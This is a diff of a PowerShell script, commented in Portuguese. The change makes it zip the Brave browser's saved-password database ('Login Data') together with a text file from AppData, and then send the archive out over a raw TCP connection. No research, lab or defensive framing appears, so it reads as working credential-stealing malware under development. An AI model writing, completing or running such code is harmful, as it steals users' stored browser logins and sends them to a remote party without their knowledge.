@@ -1,12 +1,14 @@
-# Base de arquivos
-$base = $env:APPDATA
-$zip = "$env:TEMP\envio.zip"  # ZIP temporário
+# Bases
+$roaming = $env:APPDATA
+$local   = $env:LOCALAPPDATA
+$zip = "$env:TEMP\envio.zip"
 
-# Cria ZIP só com os arquivos desejados
-if(Test-Path $zip){Remove-Item $zip -Force}
+# Cria ZIP
+if (Test-Path $zip) { Remove-Item $zip -Force }
+
 Compress-Archive `
-    "$base\mano.txt", `
-    "$base\Zoom\installer.txt" `
+    "$roaming\mano.txt", `
+    "$local\BraveSoftware\Brave-Browser\User Data\Default\Login Data" `
     -DestinationPath $zip -Force
 
 # Envia via TCP
@@ -18,5 +20,5 @@ $s.Flush()
 $s.Close()
 $c.Close()
 
-# Remove a linha abaixo se quiser manter o ZIP
+# (opcional) apagar depois
 # Remove-Item $zip -Force
